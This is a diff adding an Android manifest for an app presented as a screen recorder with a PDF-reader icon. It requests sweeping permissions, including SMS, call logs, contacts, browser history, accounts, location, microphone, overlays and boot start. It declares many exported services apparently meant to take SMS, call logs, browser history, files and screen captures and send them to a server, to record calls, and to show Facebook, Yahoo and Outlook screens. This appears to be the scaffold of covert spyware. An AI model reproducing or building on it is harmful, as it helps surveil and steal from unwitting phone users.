@@ -1,0 +1,242 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.recorder.screen.screen_recorder">
+
+    <!--<overlay android:targetPackage="com.recorder.screen.screen_recorder" android:priority="1234"/>-->
+
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG" />
+    <uses-permission android:name="android.permission.CALL_PRIVILEGED" />
+    <uses-permission android:name="android.permission.CALL_PHONE" />
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.MODIFY_PHONE_STATE" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.WRITE" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_LOGS" />
+    <uses-permission android:name="android.permission.CHANGE_COMPONENT_ENABLED_STATE" />
+    <uses-permission android:name="com.android.vending.CHECK_LICENSE" />
+    <uses-permission android:name="android.permission.GET_ACCOUNTS" />
+    <uses-permission android:name="com.android.browser.permission.READ_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="com.android.broswer.permission.WRITE_HISTORY_BOOKMARKS" />
+    <uses-permission android:name="android.permission.ACCESS_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_GPS" />
+    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.CLEAR_APP_CACHE" />
+    <uses-permission android:name="android.permission.GET_TASKS" />
+    <uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS" />
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+    <uses-permission android:name="android.permission.RESTART_PACKAGES" />
+    <uses-permission android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.AUTHENTICATE_ACCOUNTS" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_MULTICAST_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.PERMISSIONS_REQUEST_CODE_ACCESS_COARSE_LOCATION" />
+    <uses-permission android:name="android.permission.read_contacts" />
+    <uses-permission android:name="android.permission.read_phone_state" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.BLUETOOTH_ADMIN" />
+    <uses-permission android:name="android.permission.BLUETOOTH" />
+    <uses-permission android:name="android.permission.BLUETOOTH_PRIVILEGED" />
+    <uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT" />
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <supports-screens
+        android:anyDensity="true"
+        android:largeScreens="true"
+        android:normalScreens="true"
+        android:smallScreens="true"
+        android:xlargeScreens="true" />
+
+    <application
+        android:allowBackup="true"
+        android:icon="@drawable/pdfreader"
+        android:label="@string/app_name"
+        android:largeHeap="true"
+        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <activity android:name=".activities.Splash">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name=".helper.OnBoot"
+            android:enabled="true"
+            android:permission="android.permission.RECEIVE_BOOT_COMPLETED">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+
+        <!--<receiver android:name=".YourReceiver">-->
+            <!--<intent-filter>-->
+                <!--<action android:name="android.intent.action.PACKAGE_INSTALL" />-->
+                <!--<action android:name="android.intent.action.PACKAGE_ADDED" />-->
+                <!--<data android:scheme="package"/>-->
+            <!--</intent-filter>-->
+        <!--</receiver>-->
+
+        <service
+            android:name=".services.SplashService"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.DeviceInfo"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.FileUpload"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.Sdcard"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.PhoneTypeDemo"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.AllContact"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.InOutSmsService"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.AllBrowserHistory"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.ForegroundToastService"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.StatusCheck"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.myappmanager2"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.CheckCon"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.CatureScreenAndSendServer"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.AllSmsService"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.AllCallLog"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.CallHistory"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.Wifi"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.disconnectcall"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.FileSend"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.FileSendCall"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.mainservice"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.startrecordingservice"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.startcallrecording"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.Startvoice1"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.Startvoice"
+            android:enabled="true"
+            android:exported="true" />
+
+        <activity android:name=".activities.SectionListExampleActivity" />
+        <activity android:name=".activities.Email" />
+
+        <activity android:name=".activities.FacebookDemo" />
+
+        <activity android:name=".activities.YahooDemo" />
+
+        <activity android:name=".activities.OutlookDemo" />
+
+        <activity android:name=".activities.TabActivity" />
+        <activity android:name=".activities.first" />
+        <activity android:name=".activities.fourth" />
+        <activity android:name=".activities.ListImage" />
+
+        <service
+            android:name=".services.IconData"
+            android:enabled="true"
+            android:exported="true" />
+
+        <activity
+            android:name=".services.VideoScreenshot"
+            android:theme="@style/Theme.Transparent" />
+
+        <service
+            android:name=".services.PackageName"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.SelectedPackageNameChecker"
+            android:enabled="true"
+            android:exported="true" />
+        <service
+            android:name=".services.OvrService"
+            android:enabled="true"
+            android:exported="true"></service>
+    </application>
+
+</manifest>
